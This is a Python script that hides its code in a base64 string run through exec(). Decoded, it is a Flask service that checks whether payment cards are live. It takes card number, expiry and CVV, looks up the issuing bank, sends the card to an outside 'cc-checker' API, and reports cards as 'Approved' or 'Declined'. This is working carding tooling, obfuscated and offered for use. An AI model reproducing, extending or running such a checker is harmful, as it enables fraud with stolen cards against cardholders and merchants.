
import base64
exec(base64.b64decode('ZnJvbSBmbGFzayBpbXBvcnQgRmxhc2ssIHJlcXVlc3QsIGpzb25pZnkNCmltcG9ydCByZXF1ZXN0cw0KZnJvbSBkYXRldGltZSBpbXBvcnQgZGF0ZXRpbWUNCg0KYXBwID0gRmxhc2soX19uYW1lX18pDQoNCiMgRGVmaW5lIGEgc2VjcmV0IGtleSBmb3IgdmFsaWRhdGlvbg0KU0VDUkVUX0tFWSA9ICJkYXJrMzM2Ig0KDQojIFNldCB1cCB0aGUgc2Vzc2lvbiBhbmQgaGVhZGVycw0Kc2Vzc2lvbiA9IHJlcXVlc3RzLlNlc3Npb24oKQ0KaGVhZGVycyA9IHsNCiAgICAnYWNjZXB0JzogJyovKicsDQogICAgJ2FjY2VwdC1sYW5ndWFnZSc6ICdlbi1VUyxlbjtxPTAuOSxwdDtxPTAuOCcsDQogICAgJ2NvbnRlbnQtdHlwZSc6ICdhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQ7IGNoYXJzZXQ9VVRGLTgnLA0KICAgICdvcmlnaW4nOiAnaHR0cHM6Ly91bmNvZGVyLmV1Lm9yZycsDQogICAgJ3ByaW9yaXR5JzogJ3U9MSwgaScsDQogICAgJ3JlZmVyZXInOiAnaHR0cHM6Ly91bmNvZGVyLmV1Lm9yZy9jYy1jaGVja2VyLycsDQogICAgJ3NlYy1jaC11YSc6ICciQ2hyb21pdW0iO3Y9IjEzNCIsICJOb3Q6QS1CcmFuZCI7dj0iMjQiLCAiR29vZ2xlIENocm9tZSI7dj0iMTM0IicsDQogICAgJ3NlYy1jaC11YS1tb2JpbGUnOiAnPzAnLA0KICAgICdzZWMtY2gtdWEtcGxhdGZvcm0nOiAnIldpbmRvd3MiJywNCiAgICAnc2VjLWZldGNoLWRlc3QnOiAnZW1wdHknLA0KICAgICdzZWMtZmV0Y2gtbW9kZSc6ICdjb3JzJywNCiAgICAnc2VjLWZldGNoLXNpdGUnOiAnc2FtZS1vcmlnaW4nLA0KICAgICd1c2VyLWFnZW50JzogJ01vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMzQuMC4wLjAgU2FmYXJpLzUzNy4zNicsDQogICAgJ3gtcmVxdWVzdGVkLXdpdGgnOiAnWE1MSHR0cFJlcXVlc3QnLA0KfQ0KDQpkZWYgZ2V0X2Jpbl9kZXRhaWxzKGJpbl9udW1iZXIpOg0KICAgIHVybCA9IGYiaHR0cHM6Ly9iaW5zLmFudGlwdWJsaWMuY2MvYmlucy97YmluX251bWJlcn0iDQogICAgcmVzcG9uc2UgPSByZXF1ZXN0cy5nZXQodXJsKQ0KICAgIGlmIHJlc3BvbnNlLnN0YXR1c19jb2RlID09IDIwMDoNCiAgICAgICAgcmV0dXJuIHJlc3BvbnNlLmpzb24oKQ0KICAgIHJldHVybiBOb25lDQoNCmRlZiBpc19jYXJkX2V4cGlyZWQoZXhwaXJ5X21vbnRoLCBleHBpcnlfeWVhcik6DQogICAgIiIiDQogICAgQ2hlY2sgaWYgdGhlIGNhcmQgaXMgZXhwaXJlZCBiYXNlZCBvbiB0aGUgY3VycmVudCBkYXRlLg0KICAgICIiIg0KICAgIGN1cnJlbnRfZGF0ZSA9IGRhdGV0aW1lLm5vdygpDQogICAgZXhwaXJ5X2RhdGUgPSBkYXRldGltZS5zdHJwdGltZShmIntleHBpcnlfeWVhcn0te2V4cGlyeV9tb250aH0tMDEiLCAiJVktJW0tJWQiKQ0KICAgIHJldHVybiBjdXJyZW50X2RhdGUgPiBleHBpcnlfZGF0ZQ0KDQpkZWYgcGFyc2VfZXJyb3JfbWVzc2FnZShtc2cpOg0KICAgICIiIg0KICAgIFBhcnNlIHRoZSBlcnJvciBtZXNzYWdlIHRvIGRldGVybWluZSB0aGUgc3BlY2lmaWMgaXNzdWUuDQogICAgIiIiDQogICAgaWYgImNhcmQgbnVtYmVyIGluY29ycmVjdCIgaW4gbXNnLmxvd2VyKCk6DQogICAgICAgIHJldHVybiAiQ2FyZCBudW1iZXIgaXMgaW5jb3JyZWN0Ig0KICAgIGVsaWYgImV4cGlyZWQgY2FyZCIgaW4gbXNnLmxvd2VyKCk6DQogICAgICAgIHJldHVybiAiQ2FyZCBpcyBleHBpcmVkIg0KICAgIGVsaWYgImN2diBpbmNvcnJlY3QiIGluIG1zZy5sb3dlcigpOg0KICAgICAgICByZXR1cm4gIkNWViBpcyBpbmNvcnJlY3QiDQogICAgZWxzZToNCiAgICAgICAgcmV0dXJuICJJbnZhbGlkIGNhcmQgZGV0YWlscyINCg0KZGVmIGZvcm1hdF9yZXNwb25zZShjY19kZXRhaWxzLCBhcGlfcmVzcG9uc2UsIGJpbl9kZXRhaWxzLCB0aW1lX3Rha2VuLCBtZW50aW9uKToNCiAgICBjYXJkX2luZm8gPSBjY19kZXRhaWxzLnNwbGl0KCd8JykNCiAgICBjYXJkX251bWJlciA9IGNhcmRfaW5mb1swXQ0KICAgIGV4cGlyeV9tb250aCA9IGNhcmRfaW5mb1sxXQ0KICAgIGV4cGlyeV95ZWFyID0gY2FyZF9pbmZvWzJdDQogICAgY3Z2ID0gY2FyZF9pbmZvWzNdDQoNCiAgICBpbmZvID0gZiJ7Y2FyZF9udW1iZXJ9fHtleHBpcnlfbW9udGh9fHtleHBpcnlfeWVhcn18e2N2dn0iDQogICAgaXNzdWVyID0gYmluX2RldGFpbHMuZ2V0KCdiYW5rJywgJ1Vua25vd24nKSBpZiBiaW5fZGV0YWlscyBlbHNlICdVbmtub3duJw0KICAgIGNvdW50cnkgPSBiaW5fZGV0YWlscy5nZXQoJ2NvdW50cnlfbmFtZScsICdVbmtub3duJykgaWYgYmluX2RldGFpbHMgZWxzZSAnVW5rbm93bicNCiAgICBmbGFnID0gYmluX2RldGFpbHMuZ2V0KCdjb3VudHJ5X2ZsYWcnLCAnJykgaWYgYmluX2RldGFpbHMgZWxzZSAnJw0KDQogICAgIyBDaGVjayBpZiB0aGUgY2FyZCBpcyBleHBpcmVkDQogICAgaWYgaXNfY2FyZF9leHBpcmVkKGV4cGlyeV9tb250aCwgZXhwaXJ5X3llYXIpOg0KICAgICAgICBzdGF0dXMgPSAi8J2QovCdkKfwnZCv8J2QmvCdkKXwnZCi8J2QnSDinYwiDQogICAgICAgIHJlc3BvbnNlX21zZyA9ICLipL9DYXJkIGlzIGV4cGlyZWTipL4iDQogICAgZWxzZToNCiAgICAgICAgIyBEZXRlcm1pbmUgdGhlIHN0YXR1cyBhbmQgcmVzcG9uc2UgbWVzc2FnZSBiYXNlZCBvbiB0aGUgQVBJIHJlc3BvbnNlDQogICAgICAgIGlmIGFwaV9yZXNwb25zZS5nZXQoJ2Vycm9yJykgPT0gMSBhbmQgIkxpdmUiIGluIGFwaV9yZXNwb25zZS5nZXQoJ21zZycsICcnKToNCiAgICAgICAgICAgIHN0YXR1cyA9ICLwnZCA8J2QqfCdkKnwnZCr8J2QqPCdkK/wnZCe8J2QnSDinIUiDQogICAgICAgICAgICByZXNwb25zZV9tc2cgPSAi4qS/T3JkZXIgUGxhY2VkIPCflKXipL4iDQogICAgICAgIGVsaWYgImRpZSIgaW4gYXBpX3Jlc3BvbnNlLmdldCgnbXNnJywgJycpLmxvd2VyKCkgb3IgImRlYWQiIGluIGFwaV9yZXNwb25zZS5nZXQoJ21zZycsICcnKS5sb3dlcigpOg0KICAgICAgICAgICAgc3RhdHVzID0gIvCdkIPwnZCe8J2QnPCdkKXwnZCi8J2Qp/CdkJ7wnZCdIOKdjCINCiAgICAgICAgICAgIHJlc3BvbnNlX21zZyA9ICLipL9Zb3VyIENhcmQgd2FzIERlY2xpbmVk4qS+Ig0KICAgICAgICBlbHNlOg0KICAgICAgICAgICAgc3RhdHVzID0gIvCdkKLwnZCn8J2Qr/CdkJrwnZCl8J2QovCdkJ0g4p2MIg0KICAgICAgICAgICAgIyBQYXJzZSB0aGUgZXJyb3IgbWVzc2FnZSB0byBkZXRlcm1pbmUgdGhlIHNwZWNpZmljIGlzc3VlDQogICAgICAgICAgICBtc2cgPSBhcGlfcmVzcG9uc2UuZ2V0KCdtc2cnLCAnQ2FyZCBudW1iZXIgaW5jb3JyZWN0IG9yIGV4cGlyZWQgY2FyZCBvciBDVlYgaW5jb3JyZWN0IG9yIG1vcmUnKQ0KICAgICAgICAgICAgcmVzcG9uc2VfbXNnID0gcGFyc2VfZXJyb3JfbWVzc2FnZShtc2cpDQoNCiAgICByZXNwb25zZSA9IGYiIiINCuKUj+KUgeKUgeKUgeKUgeKUgeKUgeKUgeKNnw0K4pSDIHtzdGF0dXN9DQrilJfilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHilIHiipsNCuKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgQ0K4p6kIPCdl5bwnZeu8J2Xv/Cdl7EgLSB7aW5mb30NCuKepCDwnZCG8J2QmvCdkK3wnZCe8J2QsPCdkJrwnZCyIC0gU2l0ZSBCYXNlZCAwLjUkDQrinqQg8J2XpfCdl7LwnZiA8J2XvfCdl7zwnZe78J2YgPCdl7IgLSB7cmVzcG9uc2VfbXNnfQ0K4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSBDQrilrog8J2XnPCdl7vwnZez8J2XvDoge2luZm99DQrilrog8J2QiPCdkKzwnZCs8J2QrvCdkJ7wnZCrOiB7aXNzdWVyfQ0K4pa6IPCdkILwnZCo8J2QrvCdkKfwnZCt8J2Qq/CdkLI6IHtjb3VudHJ5fXtmbGFnfQ0K4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSBDQrinqXwnZen8J2XtvCdl7rwnZeyIC0ge3RpbWVfdGFrZW59DQrinqXwnZeW8J2XtfCdl7LwnZew8J2XuPCdl7LwnZexIPCdl5XwnZiGIC0ge21lbnRpb259DQrinqXwnZCB8J2QqPCdkK0g8J2QgfCdkLIg4p6cIPCdkavwnZKC8J2Sk/CdkozwnZKD8J2SkPCdkpog8J2RvyDigbcNCiIiIg0KICAgIHJldHVybiByZXNwb25zZQ0KDQpAYXBwLnJvdXRlKCcva2V5PTxrZXk+L2NjPTxjY19kZXRhaWxzPicpDQpkZWYgY2hlY2tfY2Moa2V5LCBjY19kZXRhaWxzKToNCiAgICBzdGFydF90aW1lID0gZGF0ZXRpbWUubm93KCkNCg0KICAgICMgVmFsaWRhdGUgdGhlIGtleQ0KICAgIGlmIGtleSAhPSBTRUNSRVRfS0VZOg0KICAgICAgICByZXR1cm4ganNvbmlmeSh7ImVycm9yIjogIkludmFsaWQga2V5In0pLCA0MDMNCg0KICAgICMgRXh0cmFjdCBCSU4gZnJvbSBDQyBkZXRhaWxzDQogICAgYmluX251bWJlciA9IGNjX2RldGFpbHNbOjZdDQoNCiAgICAjIEdldCBCSU4gZGV0YWlscw0KICAgIGJpbl9kZXRhaWxzID0gZ2V0X2Jpbl9kZXRhaWxzKGJpbl9udW1iZXIpDQoNCiAgICAjIFByZXBhcmUgdGhlIGRhdGEgcGF5bG9hZA0KICAgIGRhdGEgPSB7DQogICAgICAgICdkYXRhJzogY2NfZGV0YWlscywNCiAgICB9DQoNCiAgICAjIFNlbmQgdGhlIFBPU1QgcmVxdWVzdCB0byB0aGUgQVBJDQogICAgcmVzcG9uc2UgPSByZXF1ZXN0cy5wb3N0KCdodHRwczovL3VuY29kZXIuZXUub3JnL2NjLWNoZWNrZXIvYXBpLnBocCcsIGhlYWRlcnM9aGVhZGVycywgZGF0YT1kYXRhKQ0KICAgIGFwaV9yZXNwb25zZSA9IHJlc3BvbnNlLmpzb24oKQ0KDQogICAgIyBDYWxjdWxhdGUgdGltZSB0YWtlbg0KICAgIHRpbWVfdGFrZW4gPSAoZGF0ZXRpbWUubm93KCkgLSBzdGFydF90aW1lKS50b3RhbF9zZWNvbmRzKCkNCg0KICAgICMgRm9ybWF0IHRoZSByZXNwb25zZQ0KICAgIG1lbnRpb24gPSAiVXNlciIgICMgUmVwbGFjZSB3aXRoIGFjdHVhbCB1c2VyIG1lbnRpb24gaWYgYXZhaWxhYmxlDQogICAgZm9ybWF0dGVkX3Jlc3BvbnNlID0gZm9ybWF0X3Jlc3BvbnNlKGNjX2RldGFpbHMsIGFwaV9yZXNwb25zZSwgYmluX2RldGFpbHMsIGYie3RpbWVfdGFrZW46LjJmfSBzZWNvbmRzIiwgbWVudGlvbikNCg0KICAgIHJldHVybiBmb3JtYXR0ZWRfcmVzcG9uc2UNCg0KaWYgX19uYW1lX18gPT0gJ19fbWFpbl9fJzoNCiAgICBhcHAucnVuKGhvc3Q9JzAuMC4wLjAnLCBwb3J0PTUwMDAp').decode())
